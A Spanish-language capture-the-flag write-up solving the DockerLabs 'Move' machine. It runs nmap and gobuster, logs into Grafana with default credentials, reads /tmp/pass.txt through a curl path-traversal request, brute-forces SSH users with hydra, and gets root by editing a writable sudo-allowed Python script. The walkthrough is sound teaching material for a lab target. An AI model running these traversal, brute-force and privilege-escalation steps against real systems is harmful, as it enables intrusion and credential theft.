# MOVE - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Move. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./move.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: fácil
- Sistema Operativo: linux
- Autor: El Pingüino de Mario

## RECONOCIMIENTO DE RED

### conectividad y SO

Antes de empezar con el escaneo ed puertos, comprobamos que tengamos conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/5f1907b2-25b6-4c1d-8d68-e2aaf43d49ec)

vemos que recibimos respuesta con TTL 64, por lo que el sistema operativo seguramente sea Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/a0622c0c-535e-405a-8e6a-c50b4e956dda)

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

**3000 - TCP - PPP?**

Ahora hacemos sobre estos tres puertos un escaneo de versiones y también lanzamos scripts de reconocimiento estándar:

```python
nmap -p22,80,3000 -sCV 172.17.0.2 -oN targeted
```

> `-p22,80,3000` hacer el escaneo solo sobre estos tres puertos

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/38911510-1fb2-4f54-9a84-f23727d3cb97)

Vemos que en el puerto 3000 hay un servicio HTTP. Probablemente sea Grafana, ya que el puerto 3000 es su puerto por defecto.

## RECONOCIMIENTO WEB

Primero empezamos con el servicio HTTP del puerto 80. Desde consola hacemos `whatweb http://172.17.0.2`:

![image](https://github.com/user-attachments/assets/bbcf2071-acaa-4a73-ad27-1510fbdb4faf)

No vemos nada interesante. Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/4c5bb67c-3657-4f8c-99c1-0565feaf6940)

Vemos la web de Apache2 por defecto de Debian. Probamos a hacer fuzzing con gobuster, usando el directory-list-2.3-medium.txt:

```python
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,txt,py,cgi,bin,pl,sh,rb,c,cpp,html,js,bak
```

![image](https://github.com/user-attachments/assets/dedd6bbb-b630-4f51-8a1d-f89ca57760b7)

Vemos un archivo llamado maintenance.html:

![image](https://github.com/user-attachments/assets/ac314719-6497-4488-9e47-18619c11e215)

Pone "acceso en /tmp/pass.txt", pero por ahora no nos sirve de nada ya que no tenemos ningún LFI, Path Traversal o cualquier forma de ver el archivo.

Pasamos al puerto 3000. Hacemos `whatweb http://172.17.0.2:3000`:

![image](https://github.com/user-attachments/assets/cf9c76d8-4b42-4e5f-98a3-01b69188bde0)

Vemos que se nos redirige a http://172.17.0.2:3000/login, y que se usa Grafana. Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/869c49fb-8424-449b-ac63-1dd6f498e12b)

Vemos el panel de login de Grafana. Probamos a poner admin:admin, y funciona. Ahora estamos en el panel de administración:

![image](https://github.com/user-attachments/assets/2f37df60-cb37-428e-bab9-daef84e859b9)

Si buscamos en Google "Grafana exploit", vemos esto: https://exploit-notes.hdks.org/exploit/web/grafana-pentesting/. Si nos metemos, vemos que hay una ruta de Grafana en la que hay un Path Traversal. Nos podría servir para ver el archivo /tmp/pass.txt.

```python
curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../tmp/pass.txt -o pass.txt
```

Ahora hacemos `cat pass.txt`:

![image](https://github.com/user-attachments/assets/3f397bd7-915e-4a0d-81cc-08259b2c9b7d)

Y vemos lo que parece ser una contraseña. Podemos hacer fuerza bruta de usuarios con esta contraseña por SSH:

```python
hydra -L /usr/share/wordlists/rockyou.txt -p t9sH76gpQ82UFeZ3GXZS ssh://172.17.0.2
```

![image](https://github.com/user-attachments/assets/85254cc5-234f-4431-86af-7ec26447a504)

Consigue encontrar un usuario llamado freddy. Ahora para conectarnos hacemos `ssh freddy@172.17.0.2` y de contraseña t9sH76gpQ82UFeZ3GXZS.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS (ROOT)

Siendo el usuario freddy, hacemos `sudo -l` para ver nuestros privilegios especiales de sudo:

![image](https://github.com/user-attachments/assets/afd2195f-9de7-4cb5-948e-0cd9737be5dc)

Vemos que podemos ejecutar como cualquier usuario, sin usar nuestra contraseña, el script /opt/maintenance.py usando el intérprete /usr/bin/python3. Si hacemos `ls -l /opt/maintenance.py`, vemos que freddy es el propietario del script y que podemos modificarlo. Entonces lo abrimos con nano, importamos la librería os y ejecutamos una bash:

![image](https://github.com/user-attachments/assets/6130e5b0-0163-4d3e-a6f4-5a8a27c92ebc)

Ahora lo guardamos, y hacemos `sudo /usr/bin/python3 /opt/maintenance.py`:

![image](https://github.com/user-attachments/assets/b665df18-c32e-4824-aed4-1473641a0792)

Y ganamos una bash como root en la máquina Move.